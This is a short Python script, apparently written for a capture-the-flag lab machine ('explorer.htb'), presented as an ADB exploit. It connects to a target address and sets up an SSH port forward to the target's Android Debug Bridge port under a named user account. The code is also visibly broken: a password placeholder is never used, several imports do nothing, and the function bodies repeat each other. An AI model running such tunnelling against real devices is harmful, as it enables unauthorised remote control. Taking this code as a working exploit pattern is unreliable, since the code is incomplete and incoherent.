"""
Android Debug Bridge (ADB) freeciv exploit
Author : Raed-Ahsan
https://linkedin.com/in/raed-ahsan
Android 2.0 Banana Studio
"""

import socket # socket
import subprocess  # Subprocess
import pyautogui  # PyAutoGui
import time  # Time


def connection_function(host, port):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
        print(s.recv(1024))

connection_function("10.10.10.247", 2222)


def adb_connection(host, port):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
        print(s.recv(1024))

        subprocess.call(['ssh -p 2222 -L 5555:localhost:5555 kristi@explorer.htb'], shell=True)
        password = "[PASSWORD OF TARGET MACHINE OF SSH]"
        print(s.recv(1024))
  
adb_connection("10.10.10.247", 2222)
